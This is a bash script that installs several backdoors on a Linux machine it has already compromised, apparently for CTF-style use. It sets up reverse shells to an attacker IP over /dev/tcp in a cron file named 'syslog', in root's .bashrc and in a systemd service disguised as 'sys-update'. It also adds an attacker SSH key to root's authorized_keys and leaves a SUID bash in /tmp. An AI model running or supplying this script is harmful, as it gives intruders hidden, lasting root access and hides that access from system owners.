#!/bin/bash

# Created by pwnk1t 
# https://www.youtube.com/@pwnk1t
# tired of get kicked of the server? 
# this script will create multiple backdoors
# All you need is to change the IP and SSH Key


IP="<YOUR VPN IP>"

clear

echo "[+] Installing persistence..."

sleep 2
################################
# CRON BACKDOOR
################################

echo "[+] creating cron backdoor"

echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/$IP/1337 0>&1'" > /etc/cron.d/syslog

sleep 2

################################
# ROOT BASHRC
################################

echo "[+] creating bashrc backdoor"

echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc

sleep 2

################################
# SSH KEY BACKDOOR
################################

echo "[+] installing ssh key"

mkdir -p /root/.ssh

echo "<YOUR PUBLIC SSH KEY>" >> /root/.ssh/authorized_keys

chmod 600 /root/.ssh/authorized_keys

sleep 2 

################################
# SUID SHELL
################################

echo "[+] creating suid shell"

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

sleep 2

################################
# SYSTEMD SERVICE
################################

echo "[+] creating systemd persistence"

cat <<EOF > /etc/systemd/system/sys-update.service
[Unit]
Description=System Update

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/5555 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sys-update
systemctl start sys-update

sleep 2

echo ""
echo "[+] Backdoors installed"
sleep 2
echo "[!] /tmp/rootbash -p for suid backdoor" 
sleep 2
echo "[!] Open listeners:"
echo ""
sleep 1
echo -e "\033[96m1337 4444 5555\033[0m"
echo ""
